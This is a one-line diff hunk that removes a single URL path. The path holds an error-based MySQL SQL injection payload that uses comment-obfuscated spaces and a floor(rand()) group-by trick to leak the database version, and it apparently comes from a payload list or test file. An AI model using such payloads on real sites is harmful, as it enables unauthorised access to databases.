@@ -1,1 +1,0 @@
-/page/html/?56'/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(substring((select(version())),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/*.html
